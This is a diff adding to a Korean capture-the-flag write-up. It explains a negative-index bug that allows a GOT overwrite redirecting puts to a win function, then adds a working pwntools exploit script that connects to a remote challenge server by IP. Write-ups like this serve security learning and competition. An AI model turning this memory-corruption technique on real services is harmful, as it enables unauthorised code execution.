@@ -53,3 +53,25 @@ p.interactive()
 pie가 꺼져 있다. Partial RELRO이다. 행성 정보 업데이트를 하는데 음수 인덱스를 안 막아 놨다. 그래서 got overwrite가 된다. puts got을 win 함수로 덮으면 된다. system got이 망가지긴 하는데, pie가 꺼져 있어서 그냥 다시 입력 해주면 된다.
 
 ### exploit.py
+
+```python
+from pwn import *
+
+context.terminal = ['tmux', 'splitw', '-h']
+
+#p = process('./prob')
+p = remote('3.37.174.221', 33333)
+e = ELF('./prob')
+
+p.sendlineafter(b'> ', b'1')
+p.sendlineafter(b': ', b'-3')
+p.sendlineafter(b': ', p64(e.sym['win']) + b'a' * 8 + p64(0x401080))
+p.sendlineafter(b': ', b'0')
+#gdb.attach(p)
+p.sendlineafter(b': ', b'0')
+p.interactive()
+```
+
+---
+
+## pwn/Magic Palette
